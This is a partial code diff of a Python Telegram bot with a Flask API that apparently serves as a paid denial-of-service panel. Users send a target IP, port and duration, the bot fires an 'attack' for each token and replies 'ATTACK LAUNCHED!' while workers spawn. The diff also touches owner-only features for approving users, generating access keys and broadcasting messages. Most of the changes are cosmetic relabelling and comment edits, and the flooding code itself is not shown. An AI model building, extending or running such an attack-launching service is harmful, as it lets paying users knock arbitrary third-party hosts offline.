             parse_mode="Markdown",
@@ -848,7 +882,8 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text("🎯 Send *IP*:", parse_mode="Markdown",
                                    reply_markup=cancel_kb())
     elif data == "m_admin" and is_owner(uid):
-        await q.edit_message_text("👑 *ADMIN*", parse_mode="Markdown", reply_markup=admin_kb())
+        await q.edit_message_text("👑 *ADMIN PANEL*", parse_mode="Markdown",
+                                   reply_markup=admin_kb())
     elif data == "ad_users" and is_owner(uid):
         text = f"👥 *USERS ({len(approved_users)})*\n\n"
         for u, d in approved_users.items():
@@ -869,9 +904,6 @@ async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text("📢 Send message:", reply_markup=back_kb("m_admin"))
 
 
-# ============================================================
-#  📩 TEXT HANDLER
-# ============================================================
 async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if not is_approved(uid):
@@ -945,6 +977,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                                              reply_markup=main_kb(uid))
             return
 
+        # Fire attack for each token
         global active_attacks
         ids = []
         for t in toks:
@@ -961,11 +994,11 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"🚀 *ATTACK LAUNCHED!*\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"🎯 `{ip}:{port}`\n"
-            f"⏱️ `{d}s`\n"
+            f"🎯 Target: `{ip}:{port}`\n"
+            f"⏱️ Duration: `{d}s`\n"
             f"⚡ Tokens: `{len(toks)}`\n"
-            f"🆔 `{ids}`\n\n"
-            f"_Workers spawning..._",
+            f"🆔 IDs: `{ids}`\n\n"
+            f"_Workers spawning (20s load)..._",
             parse_mode="Markdown", reply_markup=main_kb(uid))
 
     elif expecting == "approve_user" and is_owner(uid):
@@ -1006,9 +1039,7 @@ async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await do_broadcast(update, ctx, text)
 
 
-# ============================================================
-#  🌐 FLASK ROUTES
-# ============================================================
+# ========== FLASK ROUTES (SAME as api.py) ==========
 @app.route('/admin/generate_key', methods=['GET'])
 def generate_key():
     if not check_password(request):
@@ -1103,23 +1134,14 @@ def home():
     })
 
 
+# ========== RUN FLASK ==========
 def run_flask():
     app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True, use_reloader=False)
 
 
-# ============================================================
-#  🤖 RUN BOT
-# ============================================================
+# ========== RUN BOT ==========
 def run_bot():
-    bot = (
-        Application.builder()
-        .token(BOT_TOKEN)
-        .read_timeout(60)
-        .write_timeout(60)
-        .connect_timeout(60)
-        .pool_timeout(60)
-        .build()
-    )
+    bot = Application.builder().token(BOT_TOKEN).build()
     bot.add_handler(CommandHandler("start", cmd_start))
     bot.add_handler(CommandHandler("help", cmd_help))
     bot.add_handler(CommandHandler("status", cmd_status))
@@ -1129,20 +1151,11 @@ def run_bot():
     bot.add_handler(CommandHandler("broadcast", cmd_broadcast))
     bot.add_handler(CallbackQueryHandler(on_button))
     bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
-
     print("🤖 Bot polling started")
-    bot.run_polling(
-        allowed_updates=Update.ALL_TYPES,
-        poll_interval=1.0,
-        timeout=60,
-        bootstrap_retries=-1,
-        drop_pending_updates=True
-    )
+    bot.run_polling(allowed_updates=Update.ALL_TYPES)
 
 
-# ============================================================
-#  🎬 MAIN
-# ============================================================
+# ========== MAIN ==========
 if __name__ == '__main__':
     print("=" * 60)
     print(f"⚡ {API_NAME}")
@@ -1161,13 +1174,16 @@ if __name__ == '__main__':
     print(f"👥 Approved:      {len(approved_users)}")
     print(f"🚀 Port:          {PORT}")
 
+    # Start pool manager
     threading.Thread(target=pool_manager, daemon=True).start()
     print("🔄 Pool manager started")
 
+    # Start Flask in background
     threading.Thread(target=run_flask, daemon=True).start()
     print(f"✅ Flask API on port {PORT}")
 
     time.sleep(3)
 
+    # Start bot (blocking)
     print("🤖 Starting Telegram bot...")
     run_bot()
